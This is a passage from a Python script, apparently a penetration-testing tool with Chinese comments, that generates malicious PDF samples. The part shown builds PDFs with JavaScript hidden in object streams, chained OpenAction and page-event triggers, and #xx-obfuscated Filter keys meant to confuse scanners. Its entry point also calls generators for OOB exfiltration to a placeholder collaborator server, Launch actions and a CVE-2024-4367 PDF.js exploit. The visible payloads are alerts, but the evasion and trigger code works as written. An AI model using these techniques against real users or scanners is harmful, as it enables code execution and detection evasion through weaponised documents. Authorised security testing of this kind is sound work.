        (0, 0, 65535),          # 对象 0：自由链表头（next=0，gen=65535 惯例）
        (1, offsets[1], 0),     # 对象 1：常规（Catalog）
        (2, offsets[2], 0),     # 对象 2：常规（Pages）
        (3, offsets[3], 0),     # 对象 3：常规（Page）
        (2, 5, 0),              # 对象 4：压缩对象（ObjStm 5 内，索引 0）
        (1, offsets[5], 0),     # 对象 5：常规（ObjStm 容器）
        (1, offsets[6], 0),     # 对象 6：常规（XRef Stream 自身）
    ]
    xref_data = b"".join(pack_entry(t, f1, f2) for t, f1, f2 in xref_entries)
    compressed = flate(xref_data)

    # XRef Stream 字典即 trailer 替代品
    obj6 = (
        b"<< /Type /XRef /W [1 4 2] /Size 7 /Root 1 0 R "
        b"/Length " + str(len(compressed)).encode() + b" /Filter /FlateDecode >>\n"
        b"stream\n" + compressed + b"\nendstream"
    )
    out += b"6 0 obj\n" + obj6 + b"\nendobj\n"
    out += b"startxref\n%d\n%%%%EOF\n" % xref_pos

    save("16_objstm_hidden.pdf", bytes(out),
         "ObjStm 对象流隐藏 JS（XRef 流 W[1 4 2]）")


# ===============================================================
# 17 组合触发链（OpenAction + /AA 双重失陷）
# ===============================================================
def gen_17_combined_triggers():
    """同时使用 /OpenAction 与 /AA 页面事件：屏蔽其一仍可能被另一链触发"""
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/AA << /O 5 0 R >> >>")
    pdf.add_object(4,
        b"<< /S /JavaScript /JS " + pdf_text("app.alert('OpenAction触发');") + b" >>")
    pdf.add_object(5,
        b"<< /S /JavaScript /JS " + pdf_text("app.alert('AA/O备用触发');") + b" >>")
    save("17_combined_triggers.pdf", pdf.build(), "组合触发链（OpenAction + /AA）")


# ===============================================================
# 18 Filter 字典混淆（v6：force_all 真混淆 + 语法修复）
# ===============================================================
def gen_18_filter_obfuscation():
    # v5 缺陷：bytes 字面量含中文 → SyntaxError；v6 用 js_ascii() 转纯 ASCII。
    # 键名全量 #xx 编码（v5 手写硬编码，v6 统一经 pdf_name_escape(force_all=True)）
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS 5 0 R >>")

    js_code = js_ascii("app.alert('Filter混淆成功执行');").encode("ascii")
    payload = flate(js_code)

    stream_dict = (
        b"<< " +
        pdf_name_escape("Filter", force_all=True) + b" " +
        pdf_name_escape("FlateDecode", force_all=True) + b" " +
        pdf_name_escape("Length", force_all=True) + b" " + str(len(payload)).encode() + b" " +
        b">>"
    )
    obj = stream_dict + b"\nstream\n" + payload + b"\nendstream"
    pdf.add_object(5, obj)

    save("18_filter_obfuscation.pdf", pdf.build(),
         "Filter 字典混淆（键名全量 #xx 编码）")


def gen_18_filter_obfuscation_advanced():
    """Filter 混淆进阶：非标准干扰键 + 键值全量混淆

    v5 三重缺陷：
      1. bytes 字面量含中文 → SyntaxError
      2. pdf_name_escape 无 force_all 参数 → TypeError
      3. /DecodeParams << /Predictor 12 >> 配 FlateDecode 要求解压后做
         PNG Up 行滤波反变换，而数据未按预测器编码 → 解出的"JS"是乱码，
         docstring 宣称"保证阅读器正确解压"不成立
    v6：删除 /DecodeParams；保留 /Decode 非标准键（合规阅读器忽略它，
    仅作为扫描器噪音），真实过滤器与长度键全量 #xx 编码。
    """
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS 5 0 R >>")

    js_code = js_ascii("app.alert('高级混淆执行成功');").encode("ascii")
    payload = flate(js_code)

    stream_dict = (
        b"<< " +
        b"/Decode " + pdf_name_escape("DCTDecode", force_all=True) + b" " +
        pdf_name_escape("Filter", force_all=True) + b" " +
        pdf_name_escape("FlateDecode", force_all=True) + b" " +
        pdf_name_escape("Length", force_all=True) + b" " + str(len(payload)).encode() + b" " +
        b">>"
    )
    obj = stream_dict + b"\nstream\n" + payload + b"\nendstream"
    pdf.add_object(5, obj)

    save("18_filter_obfuscation_adv.pdf", pdf.build(),
         "Filter 混淆进阶（非标准干扰键 + 键值 #xx 编码）")


# ===============================================================
# 主入口
# ===============================================================
if __name__ == "__main__":
    OOB_SERVER = "http://your-collab-address.com"

    print("=" * 75)
    print("PDF XSS 测试样本生成器 v6（v5 重构修复版）")
    print("仅限授权安全测试使用 | Python 3.7+")
    print("=" * 75)

    gen_01_openaction_alert()
    gen_02_openaction_exfil(OOB_SERVER)
    gen_03_uri_javascript()
    gen_04_pdfjs_fontmatrix()
    gen_05_page_aa()
    gen_06_annotation()
    gen_07_acroform()
    gen_08_hex_name_obfuscation()
    gen_09_hex_string_js()
    gen_10_flate_hidden()
    gen_11_metadata_injection()
    gen_12_embedded_filename()
    gen_13_launch_action()
    gen_14_uri_variants()
    gen_15_incremental_update()
    gen_16_objstm_hidden()
    gen_17_combined_triggers()
    gen_18_filter_obfuscation()
    gen_18_filter_obfuscation_advanced()

    print("=" * 75)
    print("19 个样本已输出到 ./%s/" % OUT_DIR)
    print("v6 相对 v5 的关键修复：")
    print("  [P0] 修复 3 处 bytes 中文 SyntaxError（v5 无法运行）")
    print("  [P0] 编码层重写：pdf_escape 严格 Latin-1 / 新增 pdf_utf16+pdf_text+js_ascii")
    print("  [P0] pdf_name_escape 实现 force_all（v5 传参即 TypeError）")
    print("  [P1] gen_02 OOB 载荷去 DOM 化（v5 的 launchURL 永不执行）")
    print("  [P1] gen_04 按官方披露重写 CVE-2024-4367（FontMatrix 字符串元素注入）")
    print("  [P1] gen_11 /Info 正确进入 trailer（v5 挂在 Catalog 无效键上）")
    print("  [P2] gen_07 补 /CO；gen_16 W 改 [1 4 2]；gen_18adv 去 Predictor 并入主流程")
    print("=" * 75)